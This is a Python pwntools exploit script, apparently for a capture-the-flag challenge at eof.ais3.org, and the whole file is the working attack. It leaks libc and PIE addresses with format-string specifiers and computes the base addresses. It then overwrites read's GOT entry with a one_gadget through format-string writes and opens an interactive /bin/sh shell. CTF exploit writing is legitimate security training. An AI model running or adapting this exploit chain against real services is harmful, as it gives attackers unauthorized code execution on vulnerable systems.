# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version
#   Author: WildfootW
#   GitHub: github.com/WildfootW
#   Copyright (C) 2019 WildfootW All rights reserved.
#


from pwn import *
import time
from my_pwn_tools import *

def print_payload(payload, message = None):
    if message != None:
        log.info(message)
    log.info("payload: " + str(payload))
    log.info("payload length: " + str(len(payload)))

context.arch = "amd64"
context.os = "linux"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"
#context.terminal = ["tmux", "split-window"] # ["gnome-terminal", "-x", "sh", "-c"] # ["tmux", "neww"]

is_local = True
#  is_local = False
#r = process("./a.out")  #r = process("./a.out", env={"LD_PRELOAD" : "./libc.so.6"})
#r.close()
# ELF("/lib/x86_64-linux-gnu/libc-2.27.so") # ELF("/lib/i386-linux-gnu/libc-2.27.so")
#libc = ELF("./libc.so")
host = "localhost"
port = 1111
if not is_local:
    host = "eof.ais3.org"
    port = 6666
r = remote(host, port)

if is_local:
    pause()
#    gdb.attach(r, execute='b main\n')

"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
libc_start_main_231_offset = 0x21b97
one_gadget_offset = 0x4f2c5
one_gadget_offset = 0x10a38c
libc_csu_init_offset = 0x1220
read_got_plt_offset = 0x4020
dprintf_got_plt_offset = 0x4018

payload = b"%10$p"
r.sendline(payload)
libc_start_main_231 = int(r.recvuntil("\n")[:-1], 16)
libc_base = libc_start_main_231 - libc_start_main_231_offset
log.info("libc base: " + hex(libc_base))

payload = b"%9$p"
r.sendline(payload)
libc_csu_init = int(r.recvuntil("\n")[:-1], 16)
pie_base = libc_csu_init - libc_csu_init_offset
log.info("pie base: " + hex(pie_base))

read_got_plt = read_got_plt_offset + pie_base
one_gadget = one_gadget_offset + libc_base
log.info("read_got_plt: " + hex(read_got_plt))
log.info("one_gadget: " + hex(one_gadget))

fmt = format_s()
fmt.start().hn(read_got_plt & 0xffff, 7).hhn(0xe8, 5)
payload = fmt.get() + b"\x00"
print_payload(payload)
time.sleep(1)
if is_local:
    pause()
r.sendline(payload)

fmt = format_s()
#fmt.start().hn((read_got_plt + 1) & 0xffff, 7).hhn(0xf0,  5)
fmt.start().hn((read_got_plt + 2) & 0xffff, 7)
payload = fmt.get() + b"\x00"
print_payload(payload)
time.sleep(1)
if is_local:
    pause()
r.sendline(payload)

fmt = format_s()
fmt.start().hn(one_gadget, 9).hhn(one_gadget >> 16,  8)
payload = fmt.get() + b"\x00"
print_payload(payload)
time.sleep(1)
if is_local:
    pause()
r.sendline(payload)

r.interactive("Pwned # ")


